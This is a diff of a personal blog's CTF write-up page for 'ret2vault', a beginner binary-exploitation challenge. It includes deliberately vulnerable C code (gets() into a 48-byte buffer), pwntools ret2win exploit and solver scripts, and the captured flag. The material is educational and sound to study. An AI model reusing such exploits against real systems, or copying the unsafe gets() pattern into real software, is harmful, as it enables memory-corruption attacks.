@@ -1,116 +1,225 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<meta name="theme-color" content="#0c0c0e">
-<title>ret2vault — FST Bootcamp — r3t0x</title>
-<meta name="description" content="The vault function holds the treasure but no direct path leads there. Overflow the buffer, chain your gadgets, and return straight into the vault to c…">
-<meta name="author" content="Ghaith Amdouni">
-<link rel="canonical" href="https://r3t0x.me/challenge/fst-bootcamp/ret2vault/">
-<meta property="og:type" content="article">
-<meta property="og:title" content="ret2vault — FST Bootcamp — r3t0x">
-<meta property="og:description" content="The vault function holds the treasure but no direct path leads there. Overflow the buffer, chain your gadgets, and return straight into the vault to c…">
-<meta property="og:url" content="https://r3t0x.me/challenge/fst-bootcamp/ret2vault/">
-<meta property="og:image" content="https://r3t0x.me/static/img/social-card.png">
-<meta name="twitter:card" content="summary_large_image">
-<link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml">
-<link rel="alternate" type="application/rss+xml" title="r3t0x — writeups" href="/feed.xml">
-<link rel="stylesheet" href="/static/css/main.css?v=405b62c3d8">
-<script src="/static/js/main.js?v=405b62c3d8" defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ret2vault // r3t0x</title>
+    <link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml">
+    <meta name="description" content="The vault function holds the treasure but no direct path leads there. Overflow the buffer, chain your gadgets, and return straight into the vault to c">
+    <link rel="stylesheet" href="../../../static/css/style.css?v=43fea522e0ce">
 </head>
 <body>
-<a class="skip" href="#main">Skip to content</a>
-<header class="masthead">
-  <div class="shell">
-    <a class="brand" href="/"><img class="mark" src="/static/img/mangekyou.png" alt="" width="20" height="20" loading="lazy" decoding="async"><span>r3t0x</span></a>
-    <nav aria-label="Main"><a href="/">home</a><a href="/blog/" aria-current="page">writeups</a><a href="/projects/">projects</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>cv</a></nav>
-    <button type="button" class="search-open" data-open-search aria-label="Search the site">search<kbd>/</kbd></button>
-  </div>
-</header>
-<main id="main"><div class="shell narrow"><article class="writeup">
-  <header class="page-head">
-    <p class="kicker"><a href="/blog/#fst-bootcamp">FST Bootcamp</a> / pwn</p>
-    <h1>ret2vault</h1>
-    <p class="lede">The vault function holds the treasure but no direct path leads there. Overflow the buffer, chain your gadgets, and return straight into the vault to c…</p>
-    <dl class="facts">
-      <div><dt>difficulty</dt><dd>medium</dd></div>
-      <div><dt>points</dt><dd>—</dd></div>
-      <div><dt>published</dt><dd><time datetime="2026-09-28">28 Sept 2026</time></dd></div>
-      <div><dt>author</dt><dd>R3t0x</dd></div>
-    </dl>
-    <p class="tags"><span>ret2win</span></p>
-  </header>
-  <nav class="toc" aria-label="On this page"><p>contents</p><ol><li><a href="#reconnaissance">Reconnaissance</a></li><li><a href="#vulnerability">Vulnerability</a></li><li><a href="#exploit">Exploit</a></li><li><a href="#result">Result</a></li><li><a href="#solver">Reference solver</a></li><li><a href="#flag">Flag</a></li></ol></nav>
-  <div class="prose">
-    <h2 id="reconnaissance">Reconnaissance</h2>
-<figure class="code"><figcaption><span>console</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>pwndbg&gt; checksec ./vault
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE</code></pre></figure>
+    <!-- Genjutsu Transition Overlay -->
+    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
+        <div class="eyelid eyelid-top"></div>
+        <div class="eyelid eyelid-bottom"></div>
+        <div class="genjutsu-eye">
+                <svg viewBox="0 0 200 200">
+                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
+                    <!-- Base 3-Tomoe -->
+                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
+                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
+                        <circle cx="100" cy="100" r="16" fill="#000"/>
+                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
+                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                    </g>
+                    <!-- Uploaded Image Mangekyo -->
+                    <defs>
+                        <clipPath id="circleClip">
+                            <circle cx="100" cy="100" r="98" />
+                        </clipPath>
+                    </defs>
+                    <image href="../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
+                </svg>
+        </div>
+    </div>
+    <div class="scanlines"></div>
+    <div class="scroll-indicator" id="scrollIndicator"></div>
+    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
+    <div class="pwndbg-bg" id="pwndbgBg"></div>
 
-<h2 id="vulnerability">Vulnerability</h2>
-<figure class="code"><figcaption><span>c</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code class="language-c"><span class="t-k">void</span> <span class="t-f">vault_open</span>() { <span class="t-f">system</span>(<span class="t-s">&quot;cat flag.txt&quot;</span>); }
-<span class="t-k">void</span> <span class="t-f">check_access</span>() {
-    <span class="t-k">char</span> code[<span class="t-m">48</span>];
-    <span class="t-f">gets</span>(code);  <span class="t-c">// unlimited overflow!</span>
-}</code></pre></figure>
+    <div class="container" style="gap: 40px;">
+
+        <a href="../../../index.html" class="back-link">← pwndbg> back</a>
+
+        <div class="chall-header">
+            <h1><span class="prefix">./</span>ret2vault<span class="cursor-blink">_</span></h1>
+            <div class="chall-meta-row">
+                <span class="tag">PWN</span>
+                <span>FST Bootcamp</span>
+                <span>0x436e15b0</span>
+                <span>by r3t0x</span>
+                
+                <span>
+                    <span class="difficulty">
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                    </span>
+                </span>
+            </div>
+        </div>
+
+        <!-- Description -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DESCRIPTION</div>
+            <div class="code-block">
+                The vault function holds the treasure but no direct path leads there. Overflow the buffer, chain your gadgets, and return straight into the vault to claim the flag.
+            </div>
+        </div>
+
+
+
+        
+        <!-- Source Code / Disasm -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DISASM // SOURCE</div>
+            
+            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// vault.c</div>
+            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+char *gets(char *); 
+void vault_open() {
+    system(&#34;cat flag.txt&#34;);
+}    
+
+void check_access() {
+    char code[48];  
+    printf(&#34;Enter access code: &#34;);
+    gets(code);  
+    if (strcmp(code, &#34;supersecret&#34;) == 0) {
+        printf(&#34;Code accepted!\n&#34;);
+    } else {
+        printf(&#34;Invalid code.\n&#34;);
+    }
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    printf(&#34;Vault Access System \n&#34;);
+    check_access();
+    printf(&#34;Session closed.\n&#34;);
+    return 0;
+}</pre>
+            </div>
+            
+        </div>
+        
+
+        
+        <!-- Writeup -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
+            <div class="writeup-content">
+                <h1>ret2vault — Writeup</h1>
+<h2>Challenge Overview</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>PWN</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Easy</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>R3t0x</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>ret2win</td>
+</tr>
+</tbody>
+</table>
+<h2>Reconnaissance</h2>
+<div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./vault
+<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
+<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
+<span class="w">    </span>Stack:<span class="w">    </span>No<span class="w"> </span>canary<span class="w"> </span>found
+<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
+<span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE
+</code></pre></div>
+
+<h2>Vulnerability</h2>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">vault_open</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;cat flag.txt&quot;</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">check_access</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">code</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span>
+<span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">code</span><span class="p">);</span><span class="w">  </span><span class="c1">// unlimited overflow!</span>
+<span class="p">}</span>
+</code></pre></div>
 
 <p>Classic <strong>ret2win</strong>: overflow <code>code[48]</code> + 8 bytes of RBP to overwrite the return address with <code>vault_open()</code>.</p>
-<h2 id="exploit">Exploit</h2>
-<figure class="code"><figcaption><span>python</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code class="language-python"><span class="t-k">from</span> pwn <span class="t-k">import</span> *
-elf = <span class="t-f">ELF</span>(<span class="t-s">'./vault'</span>)
-io = <span class="t-f">remote</span>(<span class="t-s">'35.159.81.154'</span>, <span class="t-m">7002</span>)
-payload = b<span class="t-s">'A'</span> * <span class="t-m">56</span> + <span class="t-f">p64</span>(elf.symbols[<span class="t-s">'vault_open'</span>])
-io.<span class="t-f">sendline</span>(payload)
-io.<span class="t-f">interactive</span>()</code></pre></figure>
+<h2>Exploit</h2>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vault&#39;</span><span class="p">)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;35.159.81.154&#39;</span><span class="p">,</span> <span class="mi">7002</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">56</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;vault_open&#39;</span><span class="p">])</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
 
-<h2 id="result">Result</h2>
-<figure class="code"><figcaption><span>output</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code>Vault Access System
+<h2>Result</h2>
+<div class="codehilite"><pre><span></span><code>Vault Access System
 Enter access code:
-Securinets_fst{v4ult_br34ch3d_w1th_0v3rfl0w}</code></pre></figure>
-    <h2 id="solver">Reference solver</h2>
-    <figure class="code"><figcaption><span>solve.py</span><button type="button" class="copy" data-copy>copy</button></figcaption><pre><code class="language-python"><span class="t-k">from</span> pwn <span class="t-k">import</span> *
+Securinets_fst{v4ult_br34ch3d_w1th_0v3rfl0w}
+</code></pre></div>
+            </div>
+        </div>
+        
 
-<span class="t-c"># Start process</span>
-p = <span class="t-f">remote</span>(<span class="t-s">'localhost'</span>,<span class="t-m">7005</span>)
-elf = <span class="t-f">ELF</span>(<span class="t-s">'./main'</span>)
+        
+        <!-- Exploit / Solver -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
+            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
+                <span style="color: var(--gdb-green);">$</span> python3 solve.py
+            </div>
+            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">from pwn import *
 
-<span class="t-c"># Wait for prompt</span>
-p.<span class="t-f">recvuntil</span>(b<span class="t-s">'code: '</span>)
-ret_gadget = <span class="t-m">0x40101a</span>  <span class="t-c"># Simple 'ret' instruction</span>
+# Start process
+p = remote(&#39;localhost&#39;,7005)
+elf = ELF(&#39;./main&#39;)
 
-payload = b<span class="t-s">'A'</span> * <span class="t-m">56</span>
-payload += <span class="t-f">p64</span>(ret_gadget)      <span class="t-c"># Extra ret for alignment</span>
-payload += <span class="t-f">p64</span>(elf.sym[<span class="t-s">'vault_open'</span>])
-p.<span class="t-f">sendline</span>(payload)
-output = p.<span class="t-f">recvall</span>(timeout=<span class="t-m">2</span>).<span class="t-f">decode</span>()
-<span class="t-f">print</span>(output)</code></pre></figure>
-    <h2 id="flag">Flag</h2>
-    <p class="flag"><code>Securinets_fst{v4ult_br34ch3d_w1th_0v3rfl0w}</code><button type="button" class="copy" data-copy>copy</button></p>
-  </div>
-  <nav class="pager" aria-label="More writeups">
-    <a href="/challenge/fst-bootcamp/expertly_secured/"><span>previous</span><strong>Expertly Secured</strong></a>
-    <a class="next" href="/challenge/fst-bootcamp/fragmented_scribe/"><span>next</span><strong>The Fragmented Scribe</strong></a>
-  </nav>
-</article></div></main>
-<footer class="colophon">
-  <div class="shell">
-    <p><strong>Ghaith Amdouni</strong> · Binary exploitation &amp; systems · Tunis, Tunisia</p>
-    <nav aria-label="Elsewhere"><a href="https://github.com/Ghaith-amdouni">GitHub</a><a href="https://www.linkedin.com/in/amdouni-ghaith">LinkedIn</a><a href="https://www.credly.com/users/ghaith-amdouni">Credly</a><a href="/feed.xml">RSS</a><a href="mailto:ghaith.amdouni@insat.ucar.tn">email</a></nav>
-    <p class="fine">© 2026 Ghaith Amdouni · <a href="https://github.com/Ghaith-amdouni/ghaith-amdouni.github.io">site source</a><img class="hits" src="https://hits.sh/r3t0x.me.svg?view=total&style=flat-square&label=visits&color=161619&labelColor=0c0c0e" alt="" width="88" height="20" loading="lazy"></p>
-  </div>
-</footer>
-<dialog id="search" aria-label="Search">
-  <form method="dialog" class="search-head">
-    <label for="search-input"><span aria-hidden="true">&gt;</span><span class="sr-only">Search writeups, projects and pages</span></label>
-    <input id="search-input" type="search" placeholder="search writeups, projects, pages" autocomplete="off" spellcheck="false">
-    <button value="close" aria-label="Close search">esc</button>
-  </form>
-  <ul id="search-results"></ul>
-  <p class="search-foot"><span id="search-count">start typing</span><span>&uarr;&darr; move · enter open</span></p>
-</dialog>
+# Wait for prompt
+p.recvuntil(b&#39;code: &#39;)
+ret_gadget = 0x40101a  # Simple &#39;ret&#39; instruction
+
+payload = b&#39;A&#39; * 56
+payload += p64(ret_gadget)      # Extra ret for alignment
+payload += p64(elf.sym[&#39;vault_open&#39;])
+p.sendline(payload)
+output = p.recvall(timeout=2).decode()
+print(output)
+
+</pre>
+            </div>
+        </div>
+        
+
+        <div style="height: 80px;"></div>
+    </div>
+
+    <script src="../../../static/js/main.js?v=43fea522e0ce"></script>
 </body>
 </html>
